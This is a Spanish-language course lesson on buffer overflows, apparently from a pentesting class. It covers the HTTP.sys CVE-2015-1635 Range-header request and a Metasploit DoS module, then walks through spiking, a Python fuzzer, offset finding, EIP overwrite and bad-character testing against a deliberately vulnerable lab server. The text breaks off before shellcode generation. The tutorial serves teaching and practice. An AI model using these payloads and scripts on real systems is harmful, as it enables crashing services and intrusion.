---
title: Clase 05 - Buffer Overflows
date: 2024-10-15 06:20:00 -0500
categories: [Cybersecurity,Ethical Hacking,Pentesting,Exploitation Techniques,Buffer Overflows]
tags: [buffer overflow,exploit development,pentesting,reverse shell,msfvenom,shellcode,eip control,bad characters,fuzzing,xvulnerabilities]     # TAG names should always be lowercase
---

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#008f11">0. Demo de introducción.</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />


### Buffer Overflows

- Hoy vamos a explorar la vulnerabilidad CVE-2015-1635.
- Está relacionada con el servidor web de Microsoft, Internet Information , Services (IIS), específicamente en las versiones 6.0, 7.0, 7.5, y 8.0.
- Esta vulnerabilidad reside en el manejo de solicitudes HTTP en el servidor web que el servicio IIS implementa.

### Vulnerabilidad HTTP.sys (CVE-2015-1635): Ejecución Remota de Código en IIS
La vulnerabilidad **CVE-2015-1635**, conocida como la vulnerabilidad de **HTTP.sys**, es un fallo crítico en el controlador **HTTP.sys** de **Windows**, que maneja las solicitudes HTTP en el servidor **IIS** (**Internet Information Services**). 

Esta vulnerabilidad permite la **ejecución remota de código (RCE)**, lo que podría otorgar al atacante acceso completo al sistema con privilegios de nivel SYSTEM.

### Descripción General

**HTTP.sys** es un controlador de modo kernel en Windows que procesa solicitudes y respuestas HTTP, principalmente utilizado por IIS y otros servicios basados en web. Debido a su ejecución en modo kernel, cualquier vulnerabilidad en este controlador puede tener graves consecuencias, ya que el código malicioso que se ejecute a través de esta vulnerabilidad tendrá los mismos privilegios que el sistema.

### Naturaleza de la Vulnerabilidad
- **Tipo**: Ejecución Remota de Código (RCE)
- **CVE**: CVE-2015-1635
- **Sistemas Afectados**: Windows 7, Windows 8.x, Windows Server 2008 R2, Windows Server 2012 R2 y cualquier otro sistema con IIS y HTTP.sys habilitado.
- **Severidad**: Crítica

El fallo surge cuando **HTTP.sys** maneja de manera incorrecta solicitudes HTTP especialmente manipuladas que contienen el encabezado `Range` malformado. El encabezado `Range` permite a los clientes solicitar rangos específicos de bytes de un recurso. Un encabezado `Range` manipulado puede desencadenar una **corrupción de memoria** en el controlador **HTTP.sys**.

### Cómo Funciona el Exploit

1. **Solicitud HTTP Manipulada**: El atacante envía una solicitud HTTP especialmente diseñada que contiene un encabezado `Range` malformado al servidor objetivo.

Por ejemplo:

```http
GET / HTTP/1.1
Host: servidor-objetivo
Range: bytes=0-18446744073709551615
```

2. **Corrupción de Memoria**: Cuando el controlador HTTP.sys procesa este encabezado `Range` malformado, se produce una corrupción de memoria, lo que lleva a desbordamientos de búfer u otros problemas relacionados con la memoria.

3. **Ejecución Remota de Código**: Gracias al desbordamiento de búfer, el atacante puede tomar el control del flujo de ejecución de la memoria. Esto permite ejecutar código arbitrario con privilegios SYSTEM.

4. **Compromiso del Sistema**: Una vez que el atacante obtiene privilegios de SYSTEM, puede instalar programas maliciosos, robar información sensible, manipular datos o continuar explotando el sistema.

### Impacto de la Vulnerabilidad

- **Ejecución Remota de Código**: El atacante puede tomar control completo del servidor afectado sin necesidad de autenticarse previamente.
- **Escalación de Privilegios**: Dado que **HTTP.sys** se ejecuta en modo kernel, explotar esta vulnerabilidad otorga privilegios de SYSTEM, el nivel más alto de privilegios en un sistema Windows.
- **Superficie de Ataque Amplia**: Cualquier sistema Windows que use IIS o servicios que utilicen **HTTP.sys** es vulnerable si acepta solicitudes HTTP.

### Uso del Módulo de Metasploit `auxiliary/dos/http/ms15_034_ulonglongadd`
Para aprovechar esta vulnerabilidad, Metasploit ofrece un módulo específico que puedes utilizar para probar la presencia de esta vulnerabilidad en un servidor. El módulo que debes usar es el siguiente:

```bash
use auxiliary/dos/http/ms15_034_ulonglongadd
```

### Configuración del Módulo
1. **Cargar el módulo**: Abre Metasploit y carga el módulo con el comando:

```bash
use auxiliary/dos/http/ms15_034_ulonglongadd
```

2. **Configurar la dirección IP del objetivo**: Una vez cargado, configura el objetivo con el siguiente comando:

```bash
set RHOST ip address
```

3. **Ejecutar el ataque**: Ejecuta el módulo para comprobar si el servidor es vulnerable:

```bash
run
```

Este módulo comprobará si el servidor es vulnerable a la ejecución de código remoto o a una denegación de servicio (DoS) basada en el fallo de **HTTP.sys**. Si el servidor es vulnerable, podría colapsar o reiniciarse debido a la corrupción de memoria causada por el ataque.


### Mitigación y Soluciones

Microsoft lanzó un parche como parte de la actualización MS15-034 en abril de 2015 para solucionar esta vulnerabilidad. Se recomienda encarecidamente que se aplique este parche para proteger los sistemas vulnerables.

1. **Instalar el parche de seguridad**: Asegúrate de que todos los sistemas Windows afectados estén actualizados con el parche MS15-034.
2. **Restringir el acceso HTTP**: Limita el acceso a los servicios HTTP, especialmente en redes no confiables, hasta que se pueda aplicar el parche.
3. **Monitorización de logs**: Verifica las solicitudes HTTP que contengan encabezados Range inusuales, como Range: bytes=0-18446744073709551615.

**Fin de la Demo**

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#008f11">1. Introducción a los Buffer Overflows.</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

### Buffer Overflow - Definición.
- Vulnerabilidad de seguridad que ocurre cuando un programa o proceso intenta almacenar más datos en un búfer (una zona de memoria temporal) de los que este puede contener.

- Los **búferes** son áreas de memoria asignadas para contener datos, como cadenas de texto o valores numéricos, y suelen tener un tamaño fijo.

- Cuando un programa no valida correctamente la cantidad de datos que se va a almacenar en el búfer, los datos adicionales pueden sobrescribir la memoria adyacente a dicha área.

- El concepto clave detrás de un Buffer Overflow es que el programa que gestiona la memoria no restringe adecuadamente el tamaño de los datos que se almacenan, lo que resulta en una violación de la estructura de la memoria del sistema. Este tipo de vulnerabilidad ha sido explotada históricamente para ejecutar ataques que permiten tomar control total del sistema afectado.

- En términos técnicos, los **Buffer Overflows** suelen estar relacionados con lenguajes de programación como C y C++, que no incluyen mecanismos automáticos de protección de memoria, como sí lo hacen lenguajes más modernos (Java, Python, Go). Este problema se agrava en sistemas donde se permite la ejecución directa de código en regiones de memoria donde ocurren estos desbordamientos, un aspecto que el atacante puede aprovechar para insertar código arbitrario.

### Historia y Contexto 

#### Años 60 - 70: Primeros indicios del problema

- El concepto de Buffer Overflow comenzó a observarse en los primeros sistemas, aunque no fue identificado como amenaza de seguridad. Los programadores notaron que la gestión de la memoria, si no se realizaba con cuidado, podía causar errores de ejecución.

#### 1988: El gusano Morris

- El gusano Morris fue considerado el primero gusano de Internet. Este exploit aprovechó una vulnerabilidad de desbordamiento en la función `gets()` de C, y logró propagarse rápidamente por sistemas UNIX, afectando un 10\% de las máquinas conectadas al ARPANET.

#### Década de los 90: Expansión del problema

- Durante los años 90, el Buffer Overflow fue identificado como una de las vulnerabilidades más explotadas, sobre todo en sistemas escritos en C y C++.

- Investigadores de seguridad como **Aleph One** publicaron en 1996 el artículo "Smashing The Stack For Fun and Profit", donde se explicaba cómo explotar un Buffer Overflow para controlar el flujo de ejecución de un programa. Este artículo fue un hito en la compresión y difusión del ataque.

#### 2000s: Medidas de protección y mitigación

- Code Red worm (2001).
- SQL Slammer (2003).
- La creciente notoriedad de los ataques llevó a los desarrolladores de sistemas operativos y compiladores a implementar mecanismos de protección:
    - **DEP (Data Execution Prevention)**: Introducido en sistemas Windows, este mecanismo evita que ciertos segmentos de memoria sean ejecutables, bloqueando así código inyectado en desbordamientos de búfer.
    - **ASLR (Address Space Layout Randomization)**: Introducido en sistemas como Linux y Windows, aleatoriza la disposición de los espacios de memoria, dificultando a los atacantes predecir dónde inyectar su código.
    - **Stack Canaries**: Pequeños valores aleatorios insertados en la pila para detectar modificaciones y prevenir que los ataques sobreescriban el flujo de control.

#### 2010s: Ataques más sofisticados

- Ataque Stagefright contra teléfonos Android (2015).

- A pesar de las mejoras en seguridad, los atacantes siguieron desarrollando técnicas más avanzadas como el **Return-Oriented Programming (ROP)**, que les permite explotar Buffer Overflows incluso en sistemas con protecciones como DEP y ASLR.

#### Actualidad: Persistencia del Problema

- Aún en la actualidad, los Buffers Overflows siguen siendo una de las vulnerabilidades más estudiadas y explotadas. A pesar de los avances en seguridad, siguen surgiendo vulnerabilidades en software moderno, especialmente en aplicaciones críticas o con gran base de código legado (legacy code).

- Organizaciones como **MITRE**, con su lista **CVE (Common Vulnerabilities and Exposures)**, catalogan múltiples vulnerabilidades de desbordamiento de búfer cada año, lo que resalta la importancia continua de este tipo de ataques.

### Diagrama de la memoria RAM

- Para entender cómo funciona un ataque buffer overflow, necesitamos entender cómo la memoria aloja la data en un proceso. 

- Cuando se ''corre'' programa, este necesita espacio de memoria para almacenar data.

- Para un programa típico en C, su memoria se divide en 05 segmentos, cada uno con su propio propósito.

![alt text](/assets/images/program-memory-layout.png)
*Figura 1. Diagrama de la memoria de un programa. [Fuente](https://web.ecs.syr.edu/~wedu/seed/Book/book_sample_buffer.pdf)*

- La Figura 1 describe los 05 segmentos en un diagrama de la memoria de un proceso.

- **Segmento Texto**: almacena el código ejecutable del programa. Este bloque de memoria es usualmente sólo de lectura (read-only).

- **Segmento Data**: almacena variables estáticas/globales que son inicializadas por el programador. Por ejemplo, la variable `a` definida en `static int a = 3` será almacenada en el segmento data.

- **Segmento BSS (Block Starting Symbol)**: almacena variables estáticas/globales no inicializadas. Este segmento será copado con ceros por el sistema operativo, de tal modo que las variables no inicializadas son inicializadas con ceros. Por ejemplo, la variable `b` definida en `static int b` será almacenada en el segmento BSS, y es inicializada con cero.

- **El Heap**: el heap se usa para proporcionar espacio para asignación dinámica de memoria. Esta área es administrada por las funciones `malloc`, `calloc`, `realloc`, y `free`, las cuales son funciones pertenecientes a la biblioteca estándar de C, específicamente la librería `<stdlib.h>`.

- **El Stack**: espacio de la memoria que se usa para almacenar variables locales definidas dentro de las funciones. También almacena data relacionada a funciones tipo `calls`, tales como direcciones de retorno, argumentos, etc.

- Ejemplo:


```c
int x = 100;
int main()
{
    // data stored on stack
    int a=2;
    float b=2.5;
    static int y;
    // allocate memory on heap
    int *ptr = (int *) malloc(2*sizeof(int));
    // values 5 and 6 stored on heap
    ptr[0]=5;
    ptr[1]=6;
    // deallocate memory on heap
    free(ptr);
    return 1;
}
```

- En el programa anterior:
    - La variable `x` es una variable global inicializada dentro del programa. Esta variable será alojada en el **Segmento Data**.
    - La variable `y` es una variable estática que no es inicializada, por lo tanto, es alojada en el **Segmento BSS**.
    - Las variables `a` y `b` son variables locales, las cuales son almacenadas en el stack del programa.
    - La variable `ptr` es también una variable local. Por lo tanto, es almacenada en el stack. Sin embargo, `ptr` es un **pointer** (puntero), que apunta a un bloque de memoria, el cuál es alojado de manera dinámica usando la función `malloc()`; por lo tanto, cuando los valores `5` y `6` son asignados a `ptr[1]` y `ptr[2]`, estos punteros son almacenados en el **Segmento Heap**.

### Layout general de la memoria.

![alt text](/assets/images/general-memory-layout.png)
*Figura 2. Layout general de la memoria. [Link](https://courses.cs.washington.edu/courses/cse351/17sp/lectures/CSE351-L15-buffoverflow_17sp-ink-day2-new.pdf)*

### Ejemplo de asignación de memoria

![alt text](/assets/images/memory-allocation-example.png)





















### Introducción a la Memoria

En este módulo, estudiaremos la **anatomía de la memoria** y la **estructura de la pila (stack)**. Aquí entenderemos cómo la memoria se organiza y el papel que juegan los registros importantes en los desbordamientos de búfer.

Aprenderemos sobre los siguientes componentes:

- **ESP** (Puntero de la pila)
- **EBP** (Base del marco de la pila)
- **EIP** (Puntero de instrucción)c c

![alt text](/assets/images/memorystructure.png)

Comprenderemos cómo funciona el espacio de búfer y qué ocurre cuando este se desborda. El objetivo es que podamos recnocer cómo el desbordamiento afecta al EIP, lo que permite tomar control del flujo del programa.

![alt text](/assets/images/memorystacks.png)

Si llenamos nuestro buffer space:

![alt text](/assets/images/fillingbuffer.png)

Pero, en un ataque buffer overflow:

![alt text](/assets/images/bufferoverflowattack.png)

### Pasos para un Desbordamiento de Búfer

Los pasos básicos que seguiremos para realizar un ataque de desbordamiento de búfer son los siguientes:

- **Spiking**: Un método que utilizaremos para encontrar partes vulnerables en un programa.
- **Fuzzing**: Enviaremos una gran cantidad de caracteres a un programa para ver si podemos hacerlo fallar y determinar en qué punto sucede el fallo (offset).
- **Control del EIP**: Una vez tengamos el offset, sobrescribiremos el registro EIP para tomar control del flujo del programa.
- **Identificación de caracteres malos**: Limpiaremos el código de los caracteres que puedan causar problemas.
- **Generación de shellcode**: Crearemos un código malicioso que nos permitirá obtener un reverse shell y tomar el control del sistema.

### Herramientas a utilizar

Para completar esta sección, utilizaremos una serie de herramientas:

- **Máquina con Windows**: para ejecutar el servidor vulnerable.
- **Vulnerable Server (Voland Server)**: Este software vulnerable se ejecutará en nuestra máquina Windows.
- **Immunity Debugger**: Nos permitirá analizar el comportamiento del programa y realizar el seguimiento del desbordamiento de búfer.
- **Kali Linux**: Será nuestro sistema atacante, aunque puedes utilizar cualquier distribución de Linux que prefieras.

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#008f11">2. Spiking.</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

- Antes de comenzar con el proceso de spiking, es importante realizar algunos pasos de preparación. Primero, se debe **desactivar la protección en tiempo real de Windows Defender**, ya que este podría bloquear el servidor vulnerable **Voland Server** cuando se intenten ejecutar exploits o acciones maliciosas.

- Además, es necesario que **Immunity Debugger** y **Voland Server** se ejecuten como administrador. Esto es esencial, ya que si no se ejecutan con privilegios de administrador, **Immunity Debugger** no podrá detectar que **Voland Server** está en ejecución y no se podrá acceder al mismo. Además, ejecutar **Voland Server** como administrador también asegurará que, cuando se obtenga un shell inverso, se obtengan permisos de **root** automáticamente, lo que facilitará el proceso.

### Ejecución de Voland Server e Immunity Debugger

- Una vez que ambos programas estén configurados, es hora de ejecutar **Voland Server**. Después de haber extraído el archivo en una carpeta, simplemente se debe hacer clic derecho sobre el archivo ejecutable y seleccionar "*Ejecutar como administrador*". Cuando el servidor esté en funcionamiento, deberá verse una ventana de consola indicando que está listo.

- Luego, se debe iniciar **Immunity Debugger** también como administrador. Dentro de **Immunity**, se debe seleccionar **File > Attach**, buscar el proceso de **Voland Server**, y adjuntarlo. En la esquina inferior derecha, debería aparecer "**paused**". Simplemente se debe presionar el botón de "**play**" para que aparezca el estado de "**running**". Si todo está en orden, ambos programas estarán funcionando y listos para las siguientes etapas.

### Proceso de Spiking

- El spiking es un método que se utiliza para identificar partes vulnerables en un programa. El objetivo es enviar grandes cantidades de datos a un comando específico y ver si se produce un desbordamiento del búfer, lo que resultaría en un fallo o un bloqueo del programa. Si el programa falla, se identifica esa parte como vulnerable. Si no, se pasa al siguiente comando.

- En este caso, el servidor vulnerable escucha en el puerto **9999**, y los comandos válidos se pueden ver escribiendo **HELP** una vez conectado al servidor usando **Netcat**. Entre los comandos listados, el comando **TRUN** será el foco, ya que es vulnerable a un desbordamiento de búfer.

### Conexión con Netcat

En la máquina Kali Linux, se puede usar **Netcat** para conectarse a **Voland Server**. El comando sería el siguiente:

```bash
nc IP_del_servidor_Windows 9999
```

- Una vez conectado, se puede ingresar el comando **HELP** para ver la lista de comandos válidos. La idea detrás del spiking es tomar uno de estos comandos, en este caso **TRUN**, y enviarle grandes cantidades de datos para ver si ocurre un desbordamiento.

### Uso de Herramientas de Spiking

Para realizar spiking, se utilizará la herramienta **Generic Send TCP**. Esta herramienta permite enviar datos aleatorios de diferentes tamaños a un programa para ver si ocurre un fallo. Aquí está la estructura básica del comando:

```bash
generic_send_tcp <host> <puerto> <script_spike> 0 0
```

- Un **script de spike** debe ser creado para cada comando que se desee probar. Un ejemplo de script para el comando **STATS** podría verse así:

```bash
s_readline();
s_string("STATS ");
s_string_variable("0");
```

- Esto indica que se va a enviar el comando STATS seguido de una serie de datos aleatorios al servidor. El mismo proceso se aplicará al comando TRUN:

```bash
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

- Se debe guardar cada script con un nombre descriptivo, como **stats.spk** o **trun.spk**. Luego, se ejecuta **Generic Send TCP** con los parámetros adecuados para enviar los datos.

```bash
generic_send_tcp 10.0.2.15 9999 trun.spk 0 0
...
Fuzzing Variable 0:68
Variablesize= 1024
Fuzzing Variable 0:69
Variablesize= 1023
Fuzzing Variable 0:70
Variablesize= 512
```

- No ocurre nada relevante

- Continuemos con 


### Interpretación de Resultados

- Si el programa es vulnerable, el servidor vulnerable se detendrá y **Immunity Debugger** mostrará un mensaje de error, indicando una **violación de acceso**. Esto indica que se ha sobrescrito el **registro EIP** con datos controlados por el atacante.

- Por ejemplo, si se observa que el **EIP** se sobrescribió con valores como **41414141** (que representan cuatro letras 'A'), entonces se ha conseguido un desbordamiento de búfer. En este punto, el siguiente paso será tomar control del **EIP** para ejecutar código malicioso.

### Siguiente Paso

En la siguiente sección, se profundizará en el proceso de **fuzzing**, que es una técnica similar al spiking, pero automatizando la generación de grandes volúmenes de datos. Se creará un script en **Python** para realizar fuzzing en el comando **TRUN** y continuar con el análisis del desbordamiento de búfer.

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#008f11">3. Fuzing.</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

El **fuzzing** es muy similar al proceso de **spiking** en el sentido de que se envían muchos caracteres a un comando específico con la intención de hacer que falle. La diferencia es que mientras que en el spiking se prueban múltiples comandos para encontrar cuál es vulnerable, en el fuzzing ya se sabe qué comando es vulnerable, en este caso el comando **TRUN**, y se procede a atacar ese comando de manera específica.

### Preparación

Antes de empezar con el fuzzing, se deben seguir los siguientes pasos de preparación:

1. Ejecutar **Immunity Debugger** con privilegios de administrador.
2. Ejecutar **Voland Server** también como administrador.

Si en algún momento **Voland Server** se bloquea o se cierra debido al fuzzing, es recomendable reiniciar tanto **Immunity Debugger** como **Voland Server**, y volver a adjuntar el proceso en **Immunity Debugger**.

### Desarrollo del Fuzzing

Para realizar el fuzzing, se ha construido un **script en Python**. El objetivo de este script es enviar grandes cantidades de datos al comando **TRUN** para identificar en qué punto se produce un fallo en el servidor.

### Explicación del Script

El script en Python es el siguiente:

```bash
import sys, socket
from time import sleep

buffer = "A" * 100
ip_address = '10.0.2.15'

while True:
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip_address,9999))
        s.send(('TRUN /.:/' + buffer).encode('utf-8'))
        s.close()
        sleep(1)
        buffer = buffer + "A" * 100

    except:
        print("Fuzzing crash en %s bytes " % str(len(buffer)) )
        sys.exit()

```

Este script sigue el siguiente proceso:

1. Se importan los módulos necesarios: **sys**, **socket** (para la conexión) y **sleep** (para añadir pausas entre envíos).
2. Se declara una variable llamada **buffer**, que inicialmente contiene 100 letras "**A**".
3. El script entra en un bucle **while True**, en el que intenta:
- Conectar al servidor vulnerado en la IP y puerto adecuados (9999 para **Voland Server**).
- Enviar el comando vulnerable **TRUN** seguido de un buffer de caracteres "**A**".
- Cerrar la conexión y dormir por un segundo antes de aumentar el tamaño del buffer en 100 caracteres.
- Continuar este proceso hasta que el servidor falle, lo que indicará que se ha producido un desbordamiento de búfer.
4. Cuando el servidor falla, el script imprime el tamaño del buffer que causó el fallo y se cierra.

### Ejecución del Script

Una vez guardado el script en un archivo (por ejemplo, `fuzzing.py`), se le deben otorgar permisos de ejecución con el siguiente comando en **Kali Linux**:

```bash
chmod +x fuzzing.py
```

Luego, se ejecuta el script:

```bash
./fuzzing.py
```

En este punto, Voland Server comenzará a recibir conexiones y datos en incrementos de 100 bytes. El servidor debería fallar rápidamente, y se observará que el programa se detiene en Immunity Debugger.

### Análisis del Resultado

- Después de que se produce el fallo, Immunity Debugger mostrará un mensaje de vioación de acceso (access violation). Al revisar los registros, se puede notar que el registro EIP no ha sido sobrescrito, pero lo importante es saber aproximadamente cuántos bytes fueron necesarios para hacer que el servidor falle.

- Por ejemplo, si el programa falla con alrededor de 3000 bytes, esto proporciona un punto de referencia para el siguiente paso, que es encontrar el offset exacto donde se sobrescribe el EIP.

### Siguiente Paso

En la siguiente sección, se cubrirá el proceso de encontrar el offset exacto para sobrescribir el EIP. Esto se logrará utilizando un patrón cíclico de caracteres, que permitirá identificar en qué parte del buffer se encuentra el EIP. Una vez que se tenga control sobre el EIP, se podrá redirigir el flujo del programa hacia un código malicioso.

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#008f11">4. Encontrando el Offset.</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />


Una vez que se ha identificado el punto de fallo aproximado a través del fuzzing, el siguiente paso en un ataque de desbordamiento de búfer es encontrar el **offset** exacto donde se sobrescribe el registro **EIP**. El **EIP** es el registro que indica la próxima instrucción a ejecutar en un programa, y poder controlarlo es esencial para ejecutar un exploit exitoso.

### Uso de pattern_create para encontrar el Offset

En esta etapa, se emplea una herramienta incluida en el framework de **Metasploit** llamada pattern_create. Esta herramienta genera un patrón único y cíclico de bytes, lo que nos permite identificar exactamente en qué punto se sobrescribe el **EIP** cuando se produce un fallo.

### Creación del Patrón

Primero, se debe generar un patrón cíclico de aproximadamente **3000 bytes**, ya que en el fuzzing previo se identificó que el servidor vulnerable colapsaba con buffers de alrededor de **2700 bytes**. Para esto, ejecutamos el siguiente comando en la terminal de **Kali Linux**:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
```

Este comando generará un patrón de 3000 bytes, que será utilizado para identificar el offset exacto.

### Envío del Patrón

Una vez que se ha generado el patrón, se debe modificar el script Python que anteriormente se utilizó en el fuzzing para que envíe este patrón en lugar de los caracteres repetitivos. A continuación se muestra un ejemplo de cómo realizar esto:

```python
#!/usr/bin/python
import sys, socket
from time import sleep

#buffer = "A" * 100  
buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9..." # Reemplazar con el patrón generado
ip_address = '10.0.2.15'

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, 9999))
    s.send(('TRUN /.:/' + buffer).encode('utf-8'))
    s.close()
except:
    print("Error al conectar con el servidor")
    sys.exit()

```

### Ejecución y Análisis

Después de enviar el patrón, el programa vulnerable debería colapsar de nuevo. En este punto, se debe abrir **Immunity Debugger** y observar el valor en el registro **EIP**. Este valor es crucial, ya que nos indica el punto exacto en el que el buffer sobrescribe el **EIP**. Un ejemplo de valor del **EIP** podría ser 386F4337.

### Cálculo del Offset

Con el valor del **EIP** identificado, el siguiente paso es utilizar la herramienta pattern_offset para encontrar el offset exacto dentro de los 3000 bytes generados. Esto se logra ejecutando el siguiente comando en **Kali Linux**:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386F4337 -l 3000
```

Este comando devuelve el offset exacto en el que el patrón sobrescribe el **EIP**. Supongamos que el resultado es 2003. Esto indica que después de 2003 bytes, se sobrescribe el **EIP**.

### Próximos Pasos

Una vez identificado el offset, en el siguiente paso se procede a sobrescribir el **EIP** con valores específicos y redirigir el flujo de ejecución a un shellcode malicioso, que permitirá la ejecución de código arbitrario.

Este proceso es fundamental para explotar la vulnerabilidad y tomar control del sistema vulnerable.

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#008f11">5. Sobrescribiendo el EIP.</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />


Después de haber identificado con precisión el **offset** en 2003 bytes en el paso anterior, el siguiente objetivo es sobrescribir el **EIP** (Puntero de Instrucción) con un valor controlado. Esto es crucial, ya que una vez que se controla el **EIP**, se puede redirigir el flujo del programa hacia cualquier dirección de memoria, lo que permite la ejecución de código malicioso.

### Comprendiendo el Proceso

Sabemos que el **offset** está en 2003 bytes, lo que significa que hay 2003 bytes que preceden al **EIP**. El **EIP** en sí ocupa 4 bytes, por lo que sobrescribir estos cuatro bytes es clave para tomar el control.

### Modificación del Script

Primero, es necesario modificar el script que se utilizó previamente para encontrar el offset. En este caso, se reemplaza el código que se utilizó para calcular el offset con un payload que contenga los datos para sobrescribir el **EIP**. El proceso consiste en lo siguiente:

1. Abrir el script anterior en un editor de texto, como **gedit**.
2. Eliminar la variable de offset utilizada previamente, ya que ahora se procederá a enviar datos controlados directamente para sobrescribir el **EIP**.
3. En lugar del offset, se utilizará un código que envía **2003 bytes** de "**A**" seguidos de **4 bytes** de "**B**". Esto se hace para verificar que el **EIP** se sobrescribe correctamente con los valores deseados. En términos de bytes, las "**A**" representan el valor **0x41** y las "**B**" el valor **0x42**.

El código modificado debería verse así:

```python
import sys, socket
from time import sleep

shellcode = "A" * 2003 + "B" * 4  # caracter "A" 2003 veces seguido de 4 caracters "B"
ip_address = '10.0.2.15'

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, 9999))
    s.send(('TRUN /.:/' + shellcode).encode('utf-8'))
    s.close()
except:
    print("Error al conectar con el servidor")
    sys.exit()
```

### Ejecución y Verificación

Una vez guardado el script, se puede ejecutar de la misma manera que antes. Con **Immunity Debugger** corriendo y adjuntado al servidor vulnerable, el programa se debería detener debido a una violación de acceso. Al revisar los registros en **Immunity**, el **EIP** debería haber sido sobrescrito con **42424242** (el valor hexadecimal de las "**B**"), confirmando que se ha tomado control del **EIP**.

### Análisis del Resultado

Al observar el valor **42424242** en el registro **EIP**, se puede concluir que se ha sobrescrito correctamente. Esto indica que se ha logrado el control del flujo del programa. A partir de aquí, el siguiente paso será utilizar esta capacidad para redirigir la ejecución del programa hacia un código malicioso (shellcode), lo que permitirá la ejecución remota de código.

### Próximos Pasos

Con el control del EIP ya en manos del atacante, los pasos siguientes consisten en:

1. Identificar caracteres malos: Limpiar el payload de cualquier carácter que pueda causar errores o interrupciones en la ejecución.
2. Encontrar el módulo correcto: Identificar un módulo seguro en la memoria para ejecutar el shellcode.
3. Generar shellcode: Crear un shellcode malicioso que permita obtener acceso al sistema o ejecutar comandos arbitrarios.

En resumen, controlar el EIP es un hito importante en un ataque de desbordamiento de búfer, y este proceso prepara el terreno para la explotación total del sistema.

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#008f11">6. Identificando Caracteres Malos.</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />


En esta sección, se aborda el **concepto de caracteres** malos en relación con la generación de **shellcode**. Al generar shellcode, es crucial identificar qué caracteres son seguros y cuáles pueden causar problemas durante la inyección de código. Estos caracteres "malos" son aquellos que, al estar presentes en el shellcode, pueden provocar comportamientos inesperados o interrumpir su ejecución.

### ¿Qué son los caracteres malos?

Un **carácter malo** es cualquier valor hexadecimal que podría interferir con el flujo del programa o el shellcode, ya sea porque tiene un significado especial para el programa o porque afecta cómo se procesan los datos. Por defecto, el primer carácter malo conocido es el **byte nulo (\x00)**, ya que este marca el final de una cadena en muchos lenguajes de programación. Además del byte nulo, cada programa puede tener otros caracteres que interfieran con la ejecución del shellcode.

### Proceso para identificar caracteres malos

El procedimiento para identificar estos caracteres implica pasar todos los valores hexadecimales posibles (de **0x01** a **0xFF**) a través del programa para observar si alguno causa problemas.

### Modificación del Script

Para comenzar, es necesario modificar el script que sobrescribió el **EIP** en la etapa anterior, agregando una secuencia de todos los caracteres hexadecimales posibles (exceptuando el byte nulo, que se conoce como problemático). Esta secuencia se añadirá después de los bytes que sobrescriben el **EIP**.

El script modificado debería verse así:

```python
#!/usr/bin/python
import sys, socket

# Lista de todos los caracteres hexadecimales
bad_chars = (
    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10"
    "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20"
    "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30"
    "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40"
    "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50"
    "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60"
    "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70"
    "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80"
    "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90"
    "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0"
    "\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0"
    "\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0"
    "\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0"
    "\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0"
    "\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0"
    "\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF"
)

buffer = "A" * 2003 + "B" * 4 + bad_chars  # Añadimos los caracteres malos después de sobrescribir el EIP

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('IP_DEL_SERVIDOR', 9999))
    s.send(('TRUN /.:/' + buffer))
    s.close()
except:
    print("Error al conectar con el servidor")
    sys.exit()
```

### Ejecución del Script

Una vez que el script ha sido modificado, se ejecuta de la misma manera que antes, con **Immunity Debugger** corriendo y adjuntado al servidor vulnerable. Al revisar el **dump** en **Immunity**, se debe observar la secuencia de bytes enviada, comenzando desde **0x01** y continuando hasta **0xFF**.

### Análisis del Hex Dump

